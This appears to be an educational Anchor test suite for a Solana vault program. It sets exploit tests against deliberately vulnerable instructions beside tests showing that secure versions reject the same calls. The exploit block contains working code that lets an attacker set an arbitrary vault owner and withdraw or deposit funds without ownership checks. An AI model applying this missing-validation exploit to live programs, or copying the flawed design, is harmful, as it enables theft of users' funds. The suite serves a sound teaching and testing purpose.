import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Vault } from "../target/types/vault";
import { expect } from "chai";

describe("Missing Account Validation Exploit", () => {
  // Configure the client to use the local cluster.
  anchor.setProvider(anchor.AnchorProvider.env());

  const program = anchor.workspace.Vault as Program<Vault>;
  const provider = anchor.getProvider();

  // Test accounts
  let legitimateOwner: anchor.web3.Keypair;
  let attacker: anchor.web3.Keypair;
  let vulnerableVault: anchor.web3.Keypair;
  let secureVault: anchor.web3.Keypair;

  beforeEach(async () => {
    // Generate fresh keypairs for each test
    legitimateOwner = anchor.web3.Keypair.generate();
    attacker = anchor.web3.Keypair.generate();
    vulnerableVault = anchor.web3.Keypair.generate();
    secureVault = anchor.web3.Keypair.generate();

    // Airdrop SOL to test accounts
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(legitimateOwner.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
    await provider.connection.confirmTransaction(
      await provider.connection.requestAirdrop(attacker.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL)
    );
  });

  describe("ðŸš¨ EXPLOIT DEMONSTRATION - Vulnerable Implementation", () => {
    it("Should allow attacker to initialize vault with arbitrary owner", async () => {
      console.log("\n=== EXPLOIT: Initializing vault with arbitrary owner ===");
      console.log(`Legitimate Owner: ${legitimateOwner.publicKey.toString()}`);
      console.log(`Attacker: ${attacker.publicKey.toString()}`);

      // EXPLOIT: Attacker initializes a vault claiming to be the legitimate owner
      await program.methods
        .vulnerableInitialize(new anchor.BN(1000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey, // Attacker claims this is the owner
          payer: attacker.publicKey,        // But attacker is paying and signing
        })
        .signers([attacker, vulnerableVault])
        .rpc();

      // Verify the exploit worked
      const vaultAccount = await program.account.vault.fetch(vulnerableVault.publicKey);
      console.log(`Vault owner set to: ${vaultAccount.owner.toString()}`);
      console.log(`Vault balance: ${vaultAccount.balance.toString()}`);

      expect(vaultAccount.owner.toString()).to.equal(legitimateOwner.publicKey.toString());
      expect(vaultAccount.balance.toNumber()).to.equal(1000);
      
      console.log("âœ… EXPLOIT SUCCESS: Attacker created vault with arbitrary owner!");
    });

    it("Should allow attacker to withdraw from any vault", async () => {
      console.log("\n=== EXPLOIT: Unauthorized withdrawal ===");

      // First, legitimate owner creates and funds a vault
      await program.methods
        .vulnerableInitialize(new anchor.BN(5000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          payer: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner, vulnerableVault])
        .rpc();

      // Add more funds to make it attractive
      await program.methods
        .vulnerableDeposit(new anchor.BN(10000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      let vaultAccount = await program.account.vault.fetch(vulnerableVault.publicKey);
      console.log(`Initial vault balance: ${vaultAccount.balance.toString()}`);

      // EXPLOIT: Attacker withdraws from the vault without being the owner
      console.log(`Attempting withdrawal by attacker: ${attacker.publicKey.toString()}`);
      console.log(`From vault owned by: ${vaultAccount.owner.toString()}`);

      await program.methods
        .vulnerableWithdraw(new anchor.BN(7500))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: attacker.publicKey, // Attacker signs as owner
        })
        .signers([attacker])
        .rpc();

      // Verify the exploit worked
      vaultAccount = await program.account.vault.fetch(vulnerableVault.publicKey);
      console.log(`Vault balance after attack: ${vaultAccount.balance.toString()}`);

      expect(vaultAccount.balance.toNumber()).to.equal(7500); // 15000 - 7500
      
      console.log("ðŸš¨ EXPLOIT SUCCESS: Attacker withdrew funds from victim's vault!");
    });

    it("Should allow deposit to any vault without ownership validation", async () => {
      console.log("\n=== EXPLOIT: Unauthorized deposit (potential setup for other attacks) ===");

      // Legitimate owner creates a vault
      await program.methods
        .vulnerableInitialize(new anchor.BN(1000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: legitimateOwner.publicKey,
          payer: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner, vulnerableVault])
        .rpc();

      let vaultAccount = await program.account.vault.fetch(vulnerableVault.publicKey);
      console.log(`Initial balance: ${vaultAccount.balance.toString()}`);

      // EXPLOIT: Attacker deposits to someone else's vault
      // This might seem harmless but could be used for money laundering or other attacks
      await program.methods
        .vulnerableDeposit(new anchor.BN(5000))
        .accounts({
          vault: vulnerableVault.publicKey,
          owner: attacker.publicKey, // Attacker can deposit without being owner
        })
        .signers([attacker])
        .rpc();

      vaultAccount = await program.account.vault.fetch(vulnerableVault.publicKey);
      console.log(`Balance after unauthorized deposit: ${vaultAccount.balance.toString()}`);

      expect(vaultAccount.balance.toNumber()).to.equal(6000);
      
      console.log("âš ï¸  EXPLOIT SUCCESS: Attacker deposited to victim's vault without authorization!");
    });
  });

  describe("ðŸ›¡ï¸  PROTECTION VERIFICATION - Secure Implementation", () => {
    it("Should prevent unauthorized vault initialization", async () => {
      console.log("\n=== PROTECTION: Secure initialization ===");

      try {
        // This should fail because we can't use arbitrary owner with secure implementation
        await program.methods
          .secureInitialize(new anchor.BN(1000))
          .accounts({
            vault: secureVault.publicKey,
            owner: legitimateOwner.publicKey, // Different from payer
            payer: attacker.publicKey,        // Attacker trying to pay
          })
          .signers([attacker, secureVault])
          .rpc();

        // If we reach here, the test failed
        expect.fail("Expected transaction to fail but it succeeded");
      } catch (error) {
        console.log("âœ… PROTECTION SUCCESS: Unauthorized initialization blocked");
        console.log(`Error: ${error.message}`);
        expect(error.message).to.include("has_one");
      }
    });

    it("Should prevent unauthorized withdrawals", async () => {
      console.log("\n=== PROTECTION: Secure withdrawal ===");

      // Legitimate owner creates and funds a secure vault
      await program.methods
        .secureInitialize(new anchor.BN(10000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          payer: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      let vaultAccount = await program.account.vault.fetch(secureVault.publicKey);
      console.log(`Secure vault balance: ${vaultAccount.balance.toString()}`);
      console.log(`Vault owner: ${vaultAccount.owner.toString()}`);

      try {
        // Attacker attempts to withdraw - this should fail
        console.log(`Attacker ${attacker.publicKey.toString()} attempting withdrawal...`);
        
        await program.methods
          .secureWithdraw(new anchor.BN(5000))
          .accounts({
            vault: secureVault.publicKey,
            owner: attacker.publicKey, // Wrong owner
          })
          .signers([attacker])
          .rpc();

        // If we reach here, the test failed
        expect.fail("Expected transaction to fail but it succeeded");
      } catch (error) {
        console.log("âœ… PROTECTION SUCCESS: Unauthorized withdrawal blocked");
        console.log(`Error: ${error.message}`);
        expect(error.message).to.include("has_one");
      }

      // Verify vault balance unchanged
      vaultAccount = await program.account.vault.fetch(secureVault.publicKey);
      expect(vaultAccount.balance.toNumber()).to.equal(10000);
      console.log("âœ… Vault balance remains secure");
    });

    it("Should prevent unauthorized deposits", async () => {
      console.log("\n=== PROTECTION: Secure deposit ===");

      // Legitimate owner creates a secure vault
      await program.methods
        .secureInitialize(new anchor.BN(5000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          payer: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      try {
        // Attacker attempts to deposit - this should fail
        await program.methods
          .secureDeposit(new anchor.BN(1000))
          .accounts({
            vault: secureVault.publicKey,
            owner: attacker.publicKey, // Wrong owner
          })
          .signers([attacker])
          .rpc();

        // If we reach here, the test failed
        expect.fail("Expected transaction to fail but it succeeded");
      } catch (error) {
        console.log("âœ… PROTECTION SUCCESS: Unauthorized deposit blocked");
        console.log(`Error: ${error.message}`);
        expect(error.message).to.include("has_one");
      }
    });
  });

  describe("âœ… LEGITIMATE USAGE - Normal Operations", () => {
    it("Should allow legitimate owner to use secure vault normally", async () => {
      console.log("\n=== LEGITIMATE USAGE: Normal secure operations ===");

      // Initialize vault
      await program.methods
        .secureInitialize(new anchor.BN(1000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          payer: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      let vaultAccount = await program.account.vault.fetch(secureVault.publicKey);
      console.log(`Initial balance: ${vaultAccount.balance.toString()}`);
      expect(vaultAccount.balance.toNumber()).to.equal(1000);

      // Legitimate deposit
      await program.methods
        .secureDeposit(new anchor.BN(2000))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      vaultAccount = await program.account.vault.fetch(secureVault.publicKey);
      console.log(`Balance after deposit: ${vaultAccount.balance.toString()}`);
      expect(vaultAccount.balance.toNumber()).to.equal(3000);

      // Legitimate withdrawal
      await program.methods
        .secureWithdraw(new anchor.BN(500))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner])
        .rpc();

      vaultAccount = await program.account.vault.fetch(secureVault.publicKey);
      console.log(`Final balance: ${vaultAccount.balance.toString()}`);
      expect(vaultAccount.balance.toNumber()).to.equal(2500);

      console.log("âœ… All legitimate operations completed successfully");
    });

    it("Should handle insufficient funds error correctly", async () => {
      console.log("\n=== LEGITIMATE USAGE: Error handling ===");

      // Initialize vault with small balance
      await program.methods
        .secureInitialize(new anchor.BN(100))
        .accounts({
          vault: secureVault.publicKey,
          owner: legitimateOwner.publicKey,
          payer: legitimateOwner.publicKey,
        })
        .signers([legitimateOwner, secureVault])
        .rpc();

      try {
        // Try to withdraw more than available
        await program.methods
          .secureWithdraw(new anchor.BN(500))
          .accounts({
            vault: secureVault.publicKey,
            owner: legitimateOwner.publicKey,
          })
          .signers([legitimateOwner])
          .rpc();

        expect.fail("Expected transaction to fail due to insufficient funds");
      } catch (error) {
        console.log("âœ… Insufficient funds error handled correctly");
        expect(error.message).to.include("InsufficientFunds");
      }
    });
  });
});